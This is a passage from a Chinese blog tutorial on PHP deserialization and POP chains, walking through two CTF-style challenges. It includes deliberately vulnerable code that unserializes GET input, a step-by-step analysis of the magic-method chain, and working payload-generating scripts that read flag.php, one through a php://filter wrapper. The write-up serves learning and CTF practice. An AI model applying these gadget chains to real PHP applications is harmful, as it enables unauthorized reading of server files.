<h2 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<ol>
<li>先看读文件的函数在哪：</li>
</ol>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569028390-a74e869e-b94f-470e-8740-4bb62d5ea0a9.png" alt="img"></p>
<ol>
<li>我们可控的是<code>hello参数</code>，调用<code>unserialize()</code>函数，即<code>__wakeup()</code>魔术方法，于是就只有Show类中存在该方法，但是注意到在Show.__wakeup()中存在一个<code>正则匹配</code>，这个正则匹配会将<code>$this-&gt;source</code>当成字符串来处理。也就是说会调用Show.<code>__toString()</code>方法。</li>
</ol>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569368590-46066570-31cc-4162-8b0d-9fe5e1c85f97.png" alt="img"></p>
<ol>
<li>定位到Show.<code>__toString()</code>，可以将<code>source</code>序列化为<code>Show类</code>的对象，就会调用__toString方法。__toString又会取一个<code>str[&#39;str&#39;]-&gt;source</code>，那么如果这个source不存在的话，就会执行<code>__get()</code>方法。</li>
</ol>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569456460-271f9990-534a-41dd-983e-88817e46d7e3.png" alt="img"></p>
<ol>
<li><code>__get()</code>魔术方法会调用一个<code>$p</code>变量，这个也是可控的，然后会将p当做函数调用，此时触发了Read.<code>__invoke()</code>魔术方法</li>
</ol>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569667295-b74fee32-0ed4-4380-adcc-e5455afcae36.png" alt="img"></p>
<ol>
<li><code>__invoke</code>魔术方法会触发<code>file_get()函数</code>,进而<code>base64_encode(file_get_contents($value)</code>)最终达到读文件的目的</li>
<li>对应关系：hello是Show的对象，source属性是Test的对象，p属性是Read的对象</li>
</ol>
<p>一条完整的链就形成了</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569738629-7e66a481-8c28-474a-9e06-c0ff459b158c.png" alt="img"></p>
<p>这样一条完整的链就分析完了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello -&gt; __wakeup -&gt; Show._show -&gt; Show.__toString -&gt; (不存在属性)Test.<span class="title function_ invoke__">__get</span>() -&gt; Read.__invoke</span><br></pre></td></tr></table></figure>

<p>写一个pop链</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$read</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;p = <span class="variable">$read</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;source = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>);<span class="comment">//在存在private和protected属性的情况下还是需要使用urlencode的。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">      <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<p>Modifier类</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651637062612-c7eee25d-dd33-4e57-b8ef-1dd785c928fe.png" alt="img"></p>
<p>show类</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651637607103-76e39b85-9977-42f8-b7af-a66fc3bccedc.png" alt="img"></p>
<p>在<code>__toString</code>方法可以看到<code>return $this-&gt;str-&gt;source</code>，如果让str &#x3D; Test()，那么就会访问Test-&gt;source，这时就会触发<code>__get</code>，然而触发__toString为把类转换为字符串，这在__wakeup中的<code>if(preg_match(&quot;/gopher|http|file|ftp|https|dict|../i&quot;, $this-&gt;source))</code>实现，同时__wakeup在反序列化时会自动调用，所以我们要把$this-&gt;source设置为Show类的实例化对象</p>
<p>Test类</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651643182075-05e47c76-8d5a-4744-9a1f-3e6c043984e2.png" alt="img"></p>
<p><code>__get</code>，<code>return $function()</code>，和之前的<code>__invoke</code>结合就是一个利用链，所以当前目标就变为了如何触发__get()，当访问一个不可访问或者不存在的成员变量就可以触发__get()</p>
<p>但是这两个类都没有可以直接利用的点，想利用__invoke就要先利用__get，然而__get需要访问不存在的的成员变量才可以触发，然而无论Test里面的哪个方法都没有访问到不存在的成员变量</p>
<p>构造pop链</p>
<p>Show类(__construct)–&gt;Show类(__wakeup)–&gt;Show类(__toString)–&gt;Test类(__get)–&gt;Modifier类(__invoke)</p>
<p>首先先实例化show</p>
<p>$a &#x3D; new show(‘aaa’);</p>
<p>然后再把Test的实例化对象赋值给a-&gt;str</p>
<p>$a-&gt;str&#x3D;new Test();</p>
<p>为了触发__invoke所以要把Modifier的实例化对象赋值给a-&gt;str-&gt;p</p>
<p>$a-&gt;str-&gt;p&#x3D;new Modifier();</p>
<p>为了触发__invoke所以要把Modifier的实例化对象赋值给a-&gt;str-&gt;p</p>
<p>$b&#x3D;new Show($a);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/">php反序化和pop链</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
        <p><span>发布时间:</span>2022-05-05, 00:00:00</p>
        <p><span>最后更新:</span>2022-05-28, 17:11:38</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/" title="php反序化和pop链">http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/</a>
            <span class="copy-path" data-clipboard-text="原文: http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/">
                    php反序列化题目搭建
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/">
                    sqli-labs刷题记录page-2
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">序列化与反序列化实现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POP%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B1"><span class="toc-number">3.1.</span> <span class="toc-text">实例1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B2"><span class="toc-number">3.2.</span> <span class="toc-text">实例2</span></a></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"php反序化和pop链　| Qhkk's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/" title="上一篇: php反序列化题目搭建">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/" title="下一篇: sqli-labs刷题记录page-2">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

